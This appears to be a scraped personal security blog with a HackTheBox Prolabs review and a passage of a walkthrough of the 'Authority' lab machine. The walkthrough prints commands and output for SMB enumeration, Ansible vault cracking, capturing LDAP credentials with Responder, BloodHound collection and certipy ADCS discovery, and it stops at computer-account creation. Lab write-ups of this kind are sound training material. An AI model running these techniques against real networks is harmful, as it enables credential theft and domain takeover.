






[{"content":" My Review of HackTheBox Prolabs # Overview # What are the Prolabs and why is this relevant? # Prolabs from HackTheBox, are instances where there are many machines and networks present where you can ultimately test your exploit, pivoting and privilege escalation knowledge and capture flags in the process. There are many prolabs, and mini prolabs that you can tackle with each prolab having a different theme and simulating realistic corporate enviroments (well most of them). In this review i will go over the prolabs i have taken and shares my thoughts on them whilst giving tips/advice on what i wouldve done if i was retaking them. Also i will be sharing the prolabs in order i wish to take in the future!\nNote, i have completed alot of the mini prolabs, i am only be going to reviewing the main, bigger labs.\nFirst, lets talk about Dante! # Context # Just completing my eJPT around 3 months ago, i was still fresh off what i would call a \u0026ldquo;metasploit boy\u0026rdquo;, all i knew how to do was search for known exploits with searchsploit and type \u0026ldquo;getsystem\u0026rdquo; and hope for a system shell\u0026hellip; jokes aside, i took Dante because my hacking experience as of then was only 1 host CaptureTheFlags. I probably had done around 20 easy and a couple medium machines from HackTheBox, when i heard that you could jump into whole networks! I should also note i had very little to no Active Directory experience and this was a huge learning curve for me at the time. I wanted to get started as soon as possible, though i was abit hesitant due to the pricey 50 ish dollars per month.\nReview # From a beginner standpoint and looking back at it now, Dante is an awesome first impression on hacking internal networks and a good way to get your hands dirty. Without giving too much away, in Dante you will be given an entry point IP, which essentially is the simulated publc facing web server (DMZ). You will have to enumerate and exploit this server, and use that server as a jumpbox (pivot) in order to reach the other internal network. From there, you are thrown into an Active directory enviroment, nothing too difficult but will definitely make you think if you haven\u0026rsquo;t tackled AD before. You will also need to priv esc a little bit. Overall i think Dante is a great lab for beginners, and i\u0026rsquo;d say for those of you who are planning to take eJPT, this is overkill but will prepare you no doubt for the exam.\nTips/Tools # Here are some tips for begnners that are getting ready for Dante! -\nLearn BloodHound prior as tackling AD enviroments without this should be illegal (seriously) Create a cheatsheet for the impacket tools, and use them in a couple easy Active directory boxes before attempting boxes. (Impacket suite are incredibly useful) Learn either CrackMapExec or Netexec, and honestly research some of the modules. Alot of people dont know the full potential of Netexec, you can literally pwn most AD environments with this tool alone, no joke. Take good notes, you aren\u0026rsquo;t doing the labs to show off the certificate, remember the most important thing from all the prolabs is that you learn something new that you can use in the next challenge; its a constant loop of improvement. ligolo-ng, yep thats it.. Dont be afraid to ask for help, the HackTheBox Discord community is really helpful, or message me personally (discord is .beejay) Zephyr # Context # 2 months after Dante, i decided to take Zephyr. I am following the famous OSCP box list spreadsheet, so i had done alot of the HackTheBox machines on the list, including every single Active Directory machine on the list. I had also done alot of the Vulnlab active directory chains and machines too. At this point also, i had taken a keen interest into Active Directory and red teaming. I started learning, to a basic understanding, learning a C2 (Command And Control Framework), as i had heard that this would massively aid me in these prolabs.\nReview # Zephyr consists of 17 machines and 17 flags over 3 domains. Zephyr was actually a really fun lab, with plenty of Active Directory exploitation involved where you can hone your skills and learn from. For me, the first domain was as smooth as can be, and the other domains took longer than they should have. I completed this pro lab in 3 and a half days, but i did this for around 10+ hours each of the days. The lab was stable some of the time but in my experience the lab was quite unstable at times, with alot of other players nuking ports and overall just overloading boxes with c2 implants. You may even find your attack path is easier than it should be due to other players changing the intended methods. Even after reaching enterprise admin, you still have to backtrack to reach hidden flags which i also didnt like, but overall i enjoyed Zephyr alot.\nTips/Tools # Learn, or start learning a C2 in the lab. There isn\u0026rsquo;t any obsurd evasion, but session management and efficient post exploitation will make you a better red teamer. Take organised and efficient notes. There are multiple domains, you will get lost very easily if you are not taking notes Everytime you find a new plaintext password or hash, add it to a wordlist and use it to spray against known usernames. You can use netexec to spray hashes and passwords accross subnets. Every time you compromise a machine, dump DPAPI secrets. You can use Lazagne or the netexec module to do this to make it more efficient. Rastalabs - TODO # ","date":"5 novembre 2025","externalUrl":null,"permalink":"/projects/prolabsreview/","section":"Projects","summary":"\u003ch2 class=\"relative group\"\u003eMy Review of HackTheBox Prolabs \n    \u003cdiv id=\"my-review-of-hackthebox-prolabs\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#my-review-of-hackthebox-prolabs\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\n\u003ch3 class=\"relative group\"\u003eOverview \n    \u003cdiv id=\"overview\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#overview\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h3\u003e\n\n\u003ch4 class=\"relative group\"\u003eWhat are the Prolabs and why is this relevant? \n    \u003cdiv id=\"what-are-the-prolabs-and-why-is-this-relevant\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#what-are-the-prolabs-and-why-is-this-relevant\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h4\u003e\n\u003cp\u003eProlabs from HackTheBox, are instances where there are many machines and networks present where you can ultimately test your exploit, pivoting and privilege escalation knowledge and capture flags in the process. There are many prolabs, and mini prolabs that you can tackle with each prolab having a different theme and simulating realistic corporate enviroments (well most of them). In this review i will go over the prolabs i have taken and shares my thoughts on them whilst giving tips/advice on what i wouldve done if i was retaking them. Also i will be sharing the prolabs in order i wish to take in the future!\u003c/p\u003e","title":"HackTheBox Prolabs Review","type":"projects"},{"content":"","date":"5 novembre 2025","externalUrl":null,"permalink":"/categories/projects/","section":"Categories","summary":"","title":"Projects","type":"categories"},{"content":"","date":"5 novembre 2025","externalUrl":null,"permalink":"/projects/","section":"Projects","summary":"","title":"Projects","type":"projects"},{"content":"","date":"21 settembre 2025","externalUrl":null,"permalink":"/tags/active-directory/","section":"Tags","summary":"","title":"Active Directory","type":"tags"},{"content":"","date":"21 settembre 2025","externalUrl":null,"permalink":"/tags/adcs/","section":"Tags","summary":"","title":"ADCS,","type":"tags"},{"content":"","date":"21 settembre 2025","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"Hackthebox","type":"tags"},{"content":" Overview # Platform: HackTheBox Difficulty: Medium OS: Windows Skills: Active Directory, hash-cracking, privilege escalation this is not an assumed breach\nReconnaissance # Nmap Scan # sudo nmap -sC -sV -p- -T4 10.10.11.222 -oN nmap -vv 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-21 01:50:21Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) |_ssl-date: 2025-09-21T01:51:19+00:00; +4h01m12s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) |_ssl-date: 2025-09-21T01:51:18+00:00; +4h01m11s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb | Public Key type: rsa 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb |_ssl-date: 2025-09-21T01:51:19+00:00; +4h01m12s from scanner time. 3269/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb |_ssl-date: 2025-09-21T01:51:18+00:00; +4h01m11s from scanner time. 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 8443/tcp open ssl/http syn-ack ttl 127 Apache Tomcat (language: en) |_ssl-date: TLS randomness does not represent time |_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Site doesn\u0026#39;t have a title (text/html;charset=ISO-8859-1). | ssl-cert: Subject: commonName=172.16.2.118 | Issuer: commonName=172.16.2.118 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49665/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49666/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49673/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49690/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49691/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49693/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49694/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49703/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49711/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 50224/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 64473/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 17379/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 45856/udp): CLEAN (Timeout) | Check 4 (port 12555/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2025-09-21T01:51:10 |_ start_date: N/A |_clock-skew: mean: 4h01m11s, deviation: 0s, median: 4h01m11s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Add authority.htb and authority.authority.htb to /etc/hosts\nSince this isnt an assumed breach, we dont start with any credentials, therefore we have to enumerate smb with null auths first.\ncrackmapexec smb authority.htb -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB authority.htb 445 AUTHORITY [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) SMB authority.htb 445 AUTHORITY [+] authority.htb\\: SMB authority.htb 445 AUTHORITY [-] Error enumerating shares: STATUS_ACCESS_DENIED ┌──(kali㉿kali)-[~/htb/authority] └─$ crackmapexec smb authority.htb -u \u0026#39;test\u0026#39; -p \u0026#39;\u0026#39; --shares SMB authority.htb 445 AUTHORITY [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) SMB authority.htb 445 AUTHORITY [+] authority.htb\\test: SMB authority.htb 445 AUTHORITY [+] Enumerated shares SMB authority.htb 445 AUTHORITY Share Permissions Remark SMB authority.htb 445 AUTHORITY ----- ----------- ------ SMB authority.htb 445 AUTHORITY ADMIN$ Remote Admin SMB authority.htb 445 AUTHORITY C$ Default share SMB authority.htb 445 AUTHORITY Department Shares SMB authority.htb 445 AUTHORITY Development READ SMB authority.htb 445 AUTHORITY IPC$ READ Remote IPC SMB authority.htb 445 AUTHORITY NETLOGON Logon server share SMB authority.htb 445 AUTHORITY SYSVOL Logon server share Cool, seems we have read access to “Development” which is a non-standard share and could be interesting.\nBefore we look at that, lets do RID bruting to enum some users/groups.\nRID Bruting # netexec smb authority.htb -u \u0026#39;test\u0026#39; -p \u0026#39;\u0026#39; --rid-brute SMB 10.10.11.222 445 AUTHORITY [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) SMB 10.10.11.222 445 AUTHORITY [+] authority.htb\\test: (Guest) SMB 10.10.11.222 445 AUTHORITY 498: HTB\\Enterprise Read-only Domain Controllers (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 500: HTB\\Administrator (SidTypeUser) SMB 10.10.11.222 445 AUTHORITY 501: HTB\\Guest (SidTypeUser) SMB 10.10.11.222 445 AUTHORITY 502: HTB\\krbtgt (SidTypeUser) SMB 10.10.11.222 445 AUTHORITY 512: HTB\\Domain Admins (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 513: HTB\\Domain Users (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 514: HTB\\Domain Guests (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 515: HTB\\Domain Computers (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 516: HTB\\Domain Controllers (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 517: HTB\\Cert Publishers (SidTypeAlias) SMB 10.10.11.222 445 AUTHORITY 518: HTB\\Schema Admins (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 519: HTB\\Enterprise Admins (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 520: HTB\\Group Policy Creator Owners (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 521: HTB\\Read-only Domain Controllers (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 522: HTB\\Cloneable Domain Controllers (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 525: HTB\\Protected Users (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 526: HTB\\Key Admins (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 527: HTB\\Enterprise Key Admins (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 553: HTB\\RAS and IAS Servers (SidTypeAlias) SMB 10.10.11.222 445 AUTHORITY 571: HTB\\Allowed RODC Password Replication Group (SidTypeAlias) SMB 10.10.11.222 445 AUTHORITY 572: HTB\\Denied RODC Password Replication Group (SidTypeAlias) SMB 10.10.11.222 445 AUTHORITY 1000: HTB\\AUTHORITY$ (SidTypeUser) SMB 10.10.11.222 445 AUTHORITY 1101: HTB\\DnsAdmins (SidTypeAlias) SMB 10.10.11.222 445 AUTHORITY 1102: HTB\\DnsUpdateProxy (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 1601: HTB\\svc_ldap (SidTypeUser) We only really get 2 users here - svc_ldap and AUTHORITY$ note: RID bruting wasnt absoloutely necessary in this box as you will see later on..\nLet\u0026rsquo;s use Netexec\u0026rsquo;s spider_plus module to spider the shares we have read access for and see if we can grab anything useful.\nnetexec smb authority.htb -u \u0026#39;test\u0026#39; -p \u0026#39;\u0026#39; -M spider_plus -o DOWNLOAD_FLAG=True SMB 10.10.11.222 445 AUTHORITY [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) SMB 10.10.11.222 445 AUTHORITY [+] authority.htb\\test: (Guest) SPIDER_PLUS 10.10.11.222 445 AUTHORITY [*] Started module spidering_plus with the following options: SPIDER_PLUS 10.10.11.222 445 AUTHORITY [*] DOWNLOAD_FLAG: True SPIDER_PLUS 10.10.11.222 445 AUTHORITY [*] STATS_FLAG: True SPIDER_PLUS 10.10.11.222 445 AUTHORITY [*] EXCLUDE_FILTER: [\u0026#39;print$\u0026#39;, \u0026#39;ipc$\u0026#39;] SPIDER_PLUS 10.10.11.222 445 AUTHORITY [*] EXCLUDE_EXTS: [\u0026#39;ico\u0026#39;, \u0026#39;lnk\u0026#39;] SPIDER_PLUS 10.10.11.222 445 AUTHORITY [*] MAX_FILE_SIZE: 50 KB SPIDER_PLUS 10.10.11.222 445 AUTHORITY [*] OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus SMB 10.10.11.222 445 AUTHORITY [*] Enumerated shares Note i added DOWNLOAD_FLAG=True, to ensure we dont just spider the shares but also download them all to a folder on our kali machine.\nAnsible Vault # cd Development ┌──(kali㉿kali)-[~/htb/authority/10.10.11.222/Development] └─$ ls Automation ┌──(kali㉿kali)-[~/htb/authority/10.10.11.222/Development] └─$ cd Automation ┌──(kali㉿kali)-[~/…/authority/10.10.11.222/Development/Automation] └─$ ls Ansible ┌──(kali㉿kali)-[~/…/authority/10.10.11.222/Development/Automation] └─$ cd Ansible ┌──(kali㉿kali)-[~/…/10.10.11.222/Development/Automation/Ansible] └─$ ls ADCS LDAP PWM SHARE PWM is an open source password self service application for LDAP directories. PWM is an ideal candidate for organizations that wish to “roll their own” password self service solution, but do not wish to start from scratch.\nls ansible.cfg defaults meta tasks ansible_inventory handlers README.md templates ┌──(kali㉿kali)-[~/…/Development/Automation/Ansible/PWM] └─$ cd defaults ┌──(kali㉿kali)-[~/…/Automation/Ansible/PWM/defaults] └─$ ls main.yml ┌──(kali㉿kali)-[~/…/Automation/Ansible/PWM/defaults] └─$ cat main.yml --- pwm_run_dir: \u0026#34;{{ lookup(\u0026#39;env\u0026#39;, \u0026#39;PWD\u0026#39;) }}\u0026#34; pwm_hostname: authority.htb.corp pwm_http_port: \u0026#34;{{ http_port }}\u0026#34; pwm_https_port: \u0026#34;{{ https_port }}\u0026#34; pwm_https_enable: true pwm_require_ssl: false pwm_admin_login: !vault | $ANSIBLE_VAULT;1.1;AES256 32666534386435366537653136663731633138616264323230383566333966346662313161326239 6134353663663462373265633832356663356239383039640a346431373431666433343434366139 35653634376333666234613466396534343030656165396464323564373334616262613439343033 6334326263326364380a653034313733326639323433626130343834663538326439636232306531 3438 pwm_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 31356338343963323063373435363261323563393235633365356134616261666433393263373736 3335616263326464633832376261306131303337653964350a363663623132353136346631396662 38656432323830393339336231373637303535613636646561653637386634613862316638353530 3930356637306461350a316466663037303037653761323565343338653934646533663365363035 6531 ldap_uri: ldap://127.0.0.1/ ldap_base_dn: \u0026#34;DC=authority,DC=htb\u0026#34; ldap_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 63303831303534303266356462373731393561313363313038376166336536666232626461653630 3437333035366235613437373733316635313530326639330a643034623530623439616136363563 34646237336164356438383034623462323531316333623135383134656263663266653938333334 3238343230333633350a646664396565633037333431626163306531336336326665316430613566 3764 Now this is juicy. Ansible is essentially an open-source IT automation tool that automates software configurations, deployement etc etc.\nAnsible vault is a feature of Ansible that allows you to encrypt sensitive data like passwords and API tokens within files, preventing them from being stored in plain text and exposed in repositories.\nThat being said\u0026hellip; Let\u0026rsquo;s copy each vault key to a .vault file and see if we can run ansible2john to format the .vault files to a .hash file that john will understand and then crack for us. The goal is to get the vault key to be able to decrypt the hashes inside the .yaml file.\ncat pwm_admin_login.vault $ANSIBLE_VAULT;1.1;AES256 32666534386435366537653136663731633138616264323230383566333966346662313161326239 6134353663663462373265633832356663356239383039640a346431373431666433343434366139 35653634376333666234613466396534343030656165396464323564373334616262613439343033 6334326263326364380a653034313733326639323433626130343834663538326439636232306531 3438 ansible2john pwm_admin_login.vault \u0026gt; pwm_admin_login.hash ┌──(kali㉿kali)-[~/…/Automation/Ansible/PWM/defaults] └─$ cat pwm_admin_login.hash pwm_admin_login.vault:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8 We can then use john to crack the hash\njohn pwm_admin_login.hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x]) Cost 1 (iteration count) is 10000 for all loaded hashes Will run 6 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status !@#$%^\u0026amp;* (pwm_admin_login.vault) !@#$%^\u0026amp;* - vault key\nRepeating these steps for each vault hash gave me the same vault key for each one, meaning this is a global vault key we can use to view each individual .vault file we created with the hashes.\nStore the vault key in a file somewhere for automation -\nprintf \u0026#39;%s\\n\u0026#39; \u0026#39;!@#$%^\u0026amp;*\u0026#39; \u0026gt; /tmp/vault-pass.txt chmod 600 /tmp/vault-pass.txt cat /tmp/vault-pass.txt !@#$%^\u0026amp;* Decrypt\nansible-vault view pwm_admin_login.vault --vault-password-file=/tmp/vault-pass.txt svc_pwm ┌──(kali㉿kali)-[~/…/Automation/Ansible/PWM/defaults] └─$ ansible-vault view pwm_admin_password.vault --vault-password-file=/tmp/vault-pass.txt pWm_@dm!N_!23 ┌──(kali㉿kali)-[~/…/Automation/Ansible/PWM/defaults] └─$ ansible-vault view ldap_admin_password.vault --vault-password-file=/tmp/vault-pass.txt DevT3st@123 Variables decrypted -\npwm_admin_login = svc_pwm pwm_admin_password = pWm_@dm!N_!23 ldap_admin_password = DevT3st@123 Lets navigate to the webserver running on port 8443\u0026hellip;\nhttps://10.10.11.222:8443/ The credentials we decrypted dont work for the main login page, but the pwm_admin_password value works for both of the configuration pages.\nWe can download the localDB within the Configuration manager, but the hash we get inside of it we already know so lets move on to the Configuration editor. here we can see all of the configurations of LDAP in pwm and change them accordingly.\nGoing through them all, nothing exciting stands out\u0026hellip; I tried adding a couple custom upns into them but nothing worked. Here however we can see “LDAP URLs” . You can also see the LDAP Proxy User is svc_ldap.\nWhen interacting with the “Test LDAP Profile” pwm attempts to authenticate to the LDAP URL set with the proxy user set.\nWe will change the LDAP URL to our own ip address and attempt to try to gain a connection back with credentials.\nIts worth noting that instead of “ldaps” and port “636” which are the encrypted ldap authentications, we should use “ldap” and port “389” in order to gain the credentials in cleartext.\nNTLM Relay # lets now start responder, and interact with the test button and see if we get anything back.\n$ sudo responder -I tun0 -v __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| [+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] DHCP [OFF] [+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] MQTT server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON] SNMP server [ON] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Force ESS downgrade [OFF] [+] Generic Options: Responder NIC [tun0] Responder IP [10.10.14.22] Responder IPv6 [dead:beef:2::1014] Challenge set [random] Don\u0026#39;t Respond To Names [\u0026#39;ISATAP\u0026#39;, \u0026#39;ISATAP.LOCAL\u0026#39;] Don\u0026#39;t Respond To MDNS TLD [\u0026#39;_DOSVC\u0026#39;] TTL for poisoned response [default] [+] Current Session Variables: Responder Machine Name [WIN-8XJ2TJRQVIT] Responder Domain Name [1BA8.LOCAL] Responder DCE-RPC Port [45337] [*] Version: Responder 3.1.7.0 [*] Author: Laurent Gaffie, \u0026lt;lgaffie@secorizon.com\u0026gt; [*] To sponsor Responder: https://paypal.me/PythonResponder [+] Listening for events... lDaP_1n_th3_cle4r!\nuser.txt # *Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; cd .. *Evil-WinRM* PS C:\\Users\\svc_ldap\u0026gt; dir Directory: C:\\Users\\svc_ldap Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r--- 3/24/2023 11:27 PM 3D Objects d-r--- 3/24/2023 11:27 PM Contacts d-r--- 6/28/2023 6:38 PM Desktop d-r--- 9/21/2025 9:32 AM Documents d-r--- 3/24/2023 11:27 PM Downloads d-r--- 3/24/2023 11:27 PM Favorites d-r--- 3/24/2023 11:27 PM Links d-r--- 3/24/2023 11:27 PM Music d-r--- 3/24/2023 11:27 PM Pictures d-r--- 3/24/2023 11:27 PM Saved Games d-r--- 3/24/2023 11:27 PM Searches d-r--- 3/24/2023 11:27 PM Videos *Evil-WinRM* PS C:\\Users\\svc_ldap\u0026gt; cd desktop *Evil-WinRM* PS C:\\Users\\svc_ldap\\desktop\u0026gt; dir Directory: C:\\Users\\svc_ldap\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 9/20/2025 9:48 PM 34 user.txt Let\u0026rsquo;s enumerate our new user with BloodHound\nBloodHound # faketime \u0026#39;2025-09-21 18:41:30\u0026#39; bloodhound-ce-python -u \u0026#39;svc_ldap\u0026#39; -p \u0026#39;lDaP_1n_th3_cle4r!\u0026#39; -d authority.htb -ns 10.10.11.222 -c All --zip INFO: BloodHound.py for BloodHound Community Edition INFO: Found AD domain: authority.htb INFO: Getting TGT for user INFO: Connecting to LDAP server: authority.authority.htb WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead... INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: authority.authority.htb WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead... INFO: Found 5 users INFO: Found 52 groups INFO: Found 3 gpos INFO: Found 3 ous INFO: Found 21 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: authority.authority.htb INFO: Done in 00M 04S INFO: Compressing output into 20250921184131_bloodhound.zip I cant lie, i laughed when i saw this. yeah\u0026hellip;. since this would be insanely easy, lets do it the intended way or we wont learn anything.\nCertipy-AD (ADCS) # certipy-ad find -vulnerable -u svc_ldap -password \u0026#39;lDaP_1n_th3_cle4r!\u0026#39; -dc-ip 10.10.11.222 -hide-admins -stdout Certificate Authorities 0 CA Name : AUTHORITY-CA DNS Name : authority.authority.htb Certificate Subject : CN=AUTHORITY-CA, DC=authority, DC=htb Certificate Serial Number : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4 Certificate Validity Start : 2023-04-24 01:46:26+00:00 Certificate Validity End : 2123-04-24 01:56:25+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Permissions Access Rights Enroll : AUTHORITY.HTB\\Authenticated Users [+] User Enrollable Principals : AUTHORITY.HTB\\Authenticated Users [+] User ACL Principals : AUTHORITY.HTB\\Administrators [!] Vulnerabilities ESC7 : User has dangerous permissions. Certificate Templates 0 Template Name : CorpVPN Display Name : Corp VPN Certificate Authorities : AUTHORITY-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : IncludeSymmetricAlgorithms PublishToDs AutoEnrollmentCheckUserDsCertificate Private Key Flag : ExportableKey Extended Key Usage : Encrypting File System Secure Email Client Authentication Document Signing IP security IKE intermediate IP security use KDC Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Schema Version : 2 Validity Period : 20 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Template Created : 2023-03-24T23:48:09+00:00 Template Last Modified : 2023-03-24T23:48:11+00:00 Permissions Enrollment Permissions Enrollment Rights : AUTHORITY.HTB\\Domain Computers [+] User Enrollable Principals : AUTHORITY.HTB\\Domain Computers [!] Vulnerabilities ESC1 : Enrollee supplies subject and template allows client authentication. for the next steps we need the administrator SID along with a couple other things, so lets request it via certipy.\ncertipy-ad account -u \u0026#39;svc_ldap\u0026#39; -p \u0026#39;lDaP_1n_th3_cle4r!\u0026#39; -dc-ip \u0026#39;10.10.11.222\u0026#39; -user \u0026#39;administrator\u0026#39; read [*] Reading attributes for \u0026#39;Administrator\u0026#39;: cn : Administrator distinguishedName : CN=Administrator,CN=Users,DC=authority,DC=htb name : Administrator objectSid : S-1-5-21-622327497-3269355298-2248959698-500 sAMAccountName : Administrator userAccountControl : 66048 whenCreated : 2022-08-09T22:53:10+00:00 whenChanged : 2025-09-21T01:47:33+00:00 Now that we\u0026rsquo;ve done that, the next step is to request the certificate. However, our current user does not have enrollment rights for this.\nas shown before “Enrollment Rights: Domain Computers\u0026quot; Therefore, we need to create a computer account and request one with that.\nimpacket-addcomputer 